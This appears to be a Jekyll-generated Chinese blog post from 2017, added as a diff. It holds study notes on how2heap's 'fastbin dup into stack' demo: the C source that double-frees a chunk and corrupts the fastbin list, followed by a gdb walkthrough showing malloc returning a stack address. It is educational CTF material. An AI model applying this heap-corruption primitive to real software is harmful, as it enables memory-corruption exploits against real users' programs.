@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="zh-CN" lang="zh-CN">
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+  <meta name="author" content="Vancir" />
+  <title>how2heap-03 fastbin dup into stack实践笔记</title>
+  <link rel="shortcut icon" href="/favicon.ico" />
+  <link href="/feed/" rel="alternate" title="Vancir" type="application/atom+xml" />
+  <link rel="stylesheet" href="/media/css/style.css" />
+  <link rel="stylesheet" href="/media/css/highlight.css" />
+  <script type="text/javascript" src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
+  <script type="text/javascript" src="/media/js/outliner.js"></script>
+</head>
+<!--  <body> 
+-->
+<script type="text/javascript">
+  function setTimeSpan() {
+    var date = new Date();
+    timeSpan.innerText = date.format('yyyy-MM-dd hh:mm:ss');
+  }
+
+  Date.prototype.format = function (format) {
+    var o =
+      {
+        "M+": this.getMonth() + 1, //month
+        "d+": this.getDate(),    //day
+        "h+": this.getHours(),   //hour
+        "m+": this.getMinutes(), //minute
+        "s+": this.getSeconds(), //second
+        "q+": Math.floor((this.getMonth() + 3) / 3),  //quarter
+        "S": this.getMilliseconds() //millisecond
+      }
+    if (/(y+)/.test(format))
+      format = format.replace(RegExp.$1, (this.getFullYear() + "").substr(4 - RegExp.$1.length));
+    for (var k in o)
+      if (new RegExp("(" + k + ")").test(format))
+        format = format.replace(RegExp.$1, RegExp.$1.length == 1 ? o[k] : ("00" + o[k]).substr(("" + o[k]).length));
+    return format;
+  }
+</script>
+
+<body onLoad="setInterval(setTimeSpan,1000);">
+  <div id="container">
+    <div id="main" role="main">
+      <header>
+        <h1>how2heap-03 fastbin dup into stack实践笔记</h1>
+      </header>
+      <nav id="real_nav">
+        <span>
+          <a title="home" class="" href="/">home</a>
+        </span>
+        <span>
+          <a title="categories" class="" href="/categories/">categories</a>
+        </span>
+        <span>
+          <a title="tags" class="" href="/tags/">tags</a>
+        </span>
+        <span>
+          <a title="tools" class="" href="/repo/">repo</a>
+        </span>
+        <span>
+          <a title="tools" class="" href="/act/">act</a>
+        </span>
+        <span>
+          <a title="tools" class="" href="/books/">books</a>
+        </span>
+        <span>
+          <a title="tools" class="" href="/musics/">musics</a>
+        </span>
+        <span>
+          <a title="tools" class="" href="/movies/">movies</a>
+        </span>
+        <span>
+          <a title="links" class="" href="/friends/">friends</a>
+        </span>
+        <span>
+          <a title="about" class="" href="/about/">about</a>
+        </span>
+        <span>
+          <a title="feed" class="" href="/feed">subscribe</a>
+        </span>
+      </nav>
+      <article class="content">
+        <section class="meta">
+<span class="time">
+  <time datetime="2017-08-06">2017-08-06</time>
+</span>
+
+ | 
+<span class="categories">
+  categories
+  
+  <a href="/categories/#tutorials" title="tutorials">tutorials</a>&nbsp;
+  
+</span>
+
+
+ | 
+<span class="tags">
+  tags
+  
+  <a href="/tags/#CTF" title="CTF">CTF</a>&nbsp;
+  
+  <a href="/tags/#pwn" title="pwn">pwn</a>&nbsp;
+  
+  <a href="/tags/#heap" title="heap">heap</a>&nbsp;
+  
+</span>
+
+</section>
+<section class="post">
+<blockquote>
+  <p>本文是对shellphish的<a href="https://github.com/shellphish/how2heap">how2heap</a>系列堆漏洞课程的实践笔记</p>
+</blockquote>
+
+<h2 id="示例源码">示例源码</h2>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"This file extends on fastbin_dup.c by tricking malloc into</span><span class="se">\n</span><span class="s">"</span>
+	       <span class="s">"returning a pointer to a controlled location (in this case, the stack).</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+
+	<span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">stack_var</span><span class="p">;</span>
+
+	<span class="n">printf</span><span class="p">(</span><span class="s">"The address we want malloc() to return is %p.</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="mi">8</span><span class="o">+</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">stack_var</span><span class="p">);</span>
+  <span class="cm">/* [1] */</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"Allocating 3 buffers.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+	<span class="kt">int</span> <span class="o">*</span><span class="n">a</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span>
+	<span class="kt">int</span> <span class="o">*</span><span class="n">b</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span>
+	<span class="kt">int</span> <span class="o">*</span><span class="n">c</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span>
+
+	<span class="n">printf</span><span class="p">(</span><span class="s">"1st malloc(8): %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">a</span><span class="p">);</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"2nd malloc(8): %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">b</span><span class="p">);</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"3rd malloc(8): %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">c</span><span class="p">);</span>
+
+	<span class="n">printf</span><span class="p">(</span><span class="s">"Freeing the first one...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+	<span class="n">free</span><span class="p">(</span><span class="n">a</span><span class="p">);</span>
+
+	<span class="n">printf</span><span class="p">(</span><span class="s">"If we free %p again, things will crash because %p is at the top of the free list.</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">a</span><span class="p">,</span> <span class="n">a</span><span class="p">);</span>
+	<span class="c1">// free(a);
+</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"So, instead, we'll free %p.</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">b</span><span class="p">);</span>
+	<span class="n">free</span><span class="p">(</span><span class="n">b</span><span class="p">);</span>
+
+	<span class="n">printf</span><span class="p">(</span><span class="s">"Now, we can free %p again, since it's not the head of the free list.</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">a</span><span class="p">);</span>
+	<span class="n">free</span><span class="p">(</span><span class="n">a</span><span class="p">);</span>
+
+	<span class="n">printf</span><span class="p">(</span><span class="s">"Now the free list has [ %p, %p, %p ]. "</span>
+		<span class="s">"We'll now carry out our attack by modifying data at %p.</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">,</span> <span class="n">a</span><span class="p">,</span> <span class="n">a</span><span class="p">);</span>
+
+	<span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="o">*</span><span class="n">d</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span>
+
+	<span class="n">printf</span><span class="p">(</span><span class="s">"1st malloc(8): %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">d</span><span class="p">);</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"2nd malloc(8): %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">8</span><span class="p">));</span>
+  <span class="cm">/* [2] */</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"Now the free list has [ %p ].</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">a</span><span class="p">);</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"Now, we have access to %p while it remains at the head of the free list.</span><span class="se">\n</span><span class="s">"</span>
+		<span class="s">"so now we are writing a fake free size (in this case, 0x20) to the stack,</span><span class="se">\n</span><span class="s">"</span>
+		<span class="s">"so that malloc will think there is a free chunk there and agree to</span><span class="se">\n</span><span class="s">"</span>
+		<span class="s">"return a pointer to it.</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">a</span><span class="p">);</span>
+	<span class="n">stack_var</span> <span class="o">=</span> <span class="mh">0x20</span><span class="p">;</span>
+
+	<span class="n">printf</span><span class="p">(</span><span class="s">"Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">a</span><span class="p">);</span>
+	<span class="o">*</span><span class="n">d</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span><span class="p">)</span> <span class="p">(((</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">stack_var</span><span class="p">)</span> <span class="o">-</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">d</span><span class="p">));</span>
+  <span class="cm">/* [3] */</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"3rd malloc(8): %p, putting the stack address on the free list</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">8</span><span class="p">));</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">"4th malloc(8): %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">8</span><span class="p">));</span>
+  <span class="cm">/* [4] */</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<h2 id="漏洞分析">漏洞分析</h2>
+
+<p>这节是上节fastbin dup的扩展，目的是获得一个指向任意地址的指针，在这里我们是获得一个栈的指针</p>
+
+<p>我们用gdb挂起程序，运行到<code class="highlighter-rouge">[1]</code>位置，此时我们定义了一个指针，指针的地址为<code class="highlighter-rouge">0x7fffffffdb68</code>，而我们希望<code class="highlighter-rouge">malloc()</code>返回的地址为<code class="highlighter-rouge">0x7fffffffdb70</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>The address we want malloc<span class="o">()</span> to <span class="k">return </span>is 0x7fffffffdb70.
+</code></pre></div></div>
+
+<p>继续向下，和<code class="highlighter-rouge">fastbin-dup</code>类似，因此具体过程不再描述，这里直接向下运行到<code class="highlighter-rouge">[2]</code>处</p>
+
+<p>在<code class="highlighter-rouge">[2]</code>位置，程序新定义了一个指针<code class="highlighter-rouge">d</code>，指向新分配的内存地址，也就是chunk <code class="highlighter-rouge">a</code>的地址。往下，我们的目的是在栈中写入一个<code class="highlighter-rouge">伪造的free chunk的大小</code>，在这里我们是<code class="highlighter-rouge">stack_var</code>并设定为<code class="highlighter-rouge">0x20</code></p>
+
+<p>随后在<code class="highlighter-rouge">[3]</code>位置<code class="highlighter-rouge">*d = (unsigned long long) (((char*)&amp;stack_var) - sizeof(d));</code>，这意思是将point <code class="highlighter-rouge">d</code>指向<code class="highlighter-rouge">stack_var</code>的上一个位置</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>freebins
+fast bin 0 @ 0x602000
+	free chunk @ 0x602000 - size 0x20
+	free chunk @ 0x7fffffffdb60 - size 0x20
+	free chunk @ 0x602010 - size 0x0
+gdb-peda<span class="nv">$ </span>fastbins
+fastbins
+<span class="o">[</span> fb 0 <span class="o">]</span> 0x7ffff7dd3768  -&gt; <span class="o">[</span> 0x602000 <span class="o">]</span> <span class="o">(</span>32<span class="o">)</span>
+                            <span class="o">[</span> 0x7fffffffdb60 <span class="o">]</span> <span class="o">(</span>32<span class="o">)</span>
+                            <span class="o">[</span> 0x602010 <span class="o">]</span> <span class="o">(</span>32<span class="o">)</span>
+</code></pre></div></div>
+
+<p>可以看见，实际上，通过修改了<code class="highlighter-rouge">fastbins</code>上的数据，伪造了一个新的<code class="highlighter-rouge">bin</code>，其中这个伪造<code class="highlighter-rouge">bin</code>的大小为<code class="highlighter-rouge">0x20</code>，地址为<code class="highlighter-rouge">0x7fffffffdb60</code>，也就是<code class="highlighter-rouge">*d = &amp;stack_var - sizeof(d) = 0x7fffffffdb68 - 0x08 = 0x7fffffffdb60</code>,从而向<code class="highlighter-rouge">fastbins</code>添加了一个伪造的bin，即<code class="highlighter-rouge">[ 0x602000 ] -&gt; [0x7fffffffdb60]</code>，这时再<code class="highlighter-rouge">malloc(8)</code>，那么申请两次，便可以获得一个栈上的地址，这个栈上的地址为<code class="highlighter-rouge">8+(char *)&amp;stack_var</code>，即<code class="highlighter-rouge">[0x7fffffffdb70]</code></p>
+
+<p>即得到结论</p>
+
+<blockquote>
+  <p>通过fastbins的2free并覆盖fastbins结构，我们可以获得一个指向任意地址(比如栈)的指针</p>
+</blockquote>
+
+<p><img src="http://od7mpc53s.bkt.clouddn.com/how2heap-fastbin_dup_into_stack.png" alt="fastbin_dup_into_stack" /></p>
+
+</section>
+<section align="right">
+<br/>
+<span>
+	<a  href="/2017/08/05/how2heap-02-fastbin-dup/" class="pageNav"  >Previous</a>
+	&nbsp;&nbsp;&nbsp;
+	<a  href="/2017/08/07/osmocombb+c118%E8%BF%9B%E8%A1%8CGSM%E7%9F%AD%E4%BF%A1%E5%97%85%E6%8E%A2%E5%AE%9E%E9%AA%8C/" class="pageNav"  >Next</a>
+</span>
+</section>
+
+<script type="text/javascript">
+$(function(){
+  $(document).keydown(function(e) {
+    var url = false;
+        if (e.which == 37 || e.which == 74) {  // Left arrow and J
+            
+        url = 'http://localhost:4000/2017/08/05/how2heap-02-fastbin-dup/';
+        
+        }
+        else if (e.which == 39 || e.which == 75) {  // Right arrow and K
+            
+        url = 'http://localhost:4000/2017/08/07/osmocombb+c118%E8%BF%9B%E8%A1%8CGSM%E7%9F%AD%E4%BF%A1%E5%97%85%E6%8E%A2%E5%AE%9E%E9%AA%8C/';
+        
+        }
+        if (url) {
+            window.location = url;
+        }
+  });
+})
+</script>
+
+      </article>
+      <a style="position:fixed;bottom:5px;right:5px;" href="#" title="Back to Top">
+        <img src="/assets/btt.png" />
+      </a>
+    </div>
+    <footer>
+      <p>
+        <small>
+          Powered by
+          <a href="http://jekyllrb.com" target="_blank">Jekyll</a> @
+          <a href="https://github.com/Vancir/vancir.github.io" target="_blank" title="project homepage">github</a> | Copyright 2017 - 2018 by
+          <a href="/about/">Vancir</a> |
+          <span class="label label-info" id="timeSpan"></span>
+        </small>
+      </p>
+    </footer>
+  </div>
+</body>
+
+</html>
